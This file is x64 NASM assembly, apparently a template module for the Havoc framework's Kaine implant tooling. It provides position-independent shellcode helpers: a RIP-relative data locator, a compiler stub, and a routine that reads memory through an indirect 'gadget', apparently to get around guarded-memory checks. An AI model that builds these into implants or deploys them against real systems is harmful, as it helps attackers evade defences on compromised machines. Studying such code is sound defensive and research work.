;;
;; Havoc kaine template module
;;
[BITS 64]

DEFAULT REL

;;
;; Export
;;
GLOBAL ___chkstk_ms
GLOBAL KnRipData
GLOBAL KnUnguardPtr

;;
;; Retrieving data and string literals
;;
[SECTION .text$F]
    ;;
    ;; get rip to the included .rdata section
    ;;
    KnRipData:
        call KnRetPtrData
    ret
    ;;
    ;; get the return address of RetPtrData and put it into the rax register
    ;;
    KnRetPtrData:
        mov	rax, [rsp]
        sub	rax, 0x5
    ret

;;
;; shellcode functions
;;
[SECTION .text$B]
    ;;
    ;; fixes some compiler unresolved symbol issue
    ;;
    ___chkstk_ms:
        ;; dont execute anything
    ret

    ;;
    ;; reads/deref memory using specified gadget
    ;;
    ;; ReadPtr( target[rcx], gadget[rdx] )
    ;;
    ;; NOTE:
    ;;  if gadget is equal NULL then it is
    ;;  going to read the specified target
    ;;  normally (in the current function)
    KnUnguardPtr:
        test rdx, rdx         ;; check if gadget[rdx] == NULL
        jz   norm             ;; if gadget[rdx] is NULL then read it normally
      ;; read using the specified gadget
      read:
        mov rax, rcx          ;; specify what we wanna read.
        jmp rdx               ;; jump to memory/pointer read gadget
        ret                   ;; we finished what we wanted to read
      norm:
        mov rax, QWORD [rcx]  ;; read specified pointer value into rax
    ret		                  ;; we finished what we wanted to read

[SECTION .text$P]
    SymKaineEnd:
        db 'K', 'A', 'I', 'N', 'E', '-', 'E', 'N', 'D'